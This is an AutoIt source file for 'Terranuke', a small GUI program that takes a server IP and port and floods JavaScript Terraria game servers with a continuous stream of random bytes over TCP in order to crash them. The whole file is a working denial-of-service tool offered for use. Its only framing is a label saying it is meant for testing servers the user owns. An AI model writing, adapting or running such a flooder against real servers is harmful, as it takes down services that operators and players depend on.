
#include <ButtonConstants.au3>
#include <EditConstants.au3>
#include <GUIConstantsEx.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>

Opt("GUIOnEventMode", 1)

Global $IsNuking = false;

$Form1 = GUICreate("Terranuke", 615, 131, 378, 369)
$ServerIP = GUICtrlCreateInput("Server IP", 0, 0, 121, 21)
$ServerPort = GUICtrlCreateInput("Port", 0, 24, 121, 21)
$Nuke = GUICtrlCreateButton("N U K E", 0, 48, 123, 25)
GUICtrlSetOnEvent(-1, "NukeClick")
$ServerOutput = GUICtrlCreateEdit("", 128, 0, 481, 73)
$Label1 = GUICtrlCreateLabel("Utility for nuking JavaScript Terraria servers. Might work sometimes, might fail sometimes. Taking down a server takes around", 8, 80, 591, 17)
$Label2 = GUICtrlCreateLabel("10 minutes, requiring a few runs of the tool. Made by Krzysztof Szewczyk. The tool is intended for security testing of servers", 8, 96, 600, 17)
$Label3 = GUICtrlCreateLabel("you OWN or you are permitted to take down. BSD license terms apply.", 8, 112, 384, 17)
GUISetState(@SW_SHOW)

While 1
	If $IsNuking Then
		TCPStartup()
		
		$socket = TCPConnect(GUICtrlRead($ServerIP), Int(GUICtrlRead($ServerPort)))
		
		If @error Then
			GUICtrlSetData($ServerOutput, StringFormat("[ERROR] Invalid port specification or server couldn't be reached."))
			$IsNuking = false
		Else
			If $socket = -1 Then
				GUICtrlSetData($ServerOutput, StringFormat("[ERROR] Server unreachable."))
				$IsNuking = false
			Else
				While $IsNuking
					$bytesSent = TCPSend($socket, Chr(Random(0, 255, 1)))
				
					GUICtrlSetData($ServerOutput, GUICtrlRead($ServerOutput) & TCPRecv($socket, 1))
				
					If $bytesSent = 0 Then
						GUICtrlSetData($ServerOutput, StringFormat("[ERROR] Could not send packet."))
						$IsNuking = false
					EndIf
				WEnd
				
				TCPCloseSocket($socket)
				TCPShutdown()
			EndIf
		EndIF
	EndIf
	
	Sleep(10)
WEnd

Func NukeClick()
	$IsNuking = not $IsNuking
EndFunc
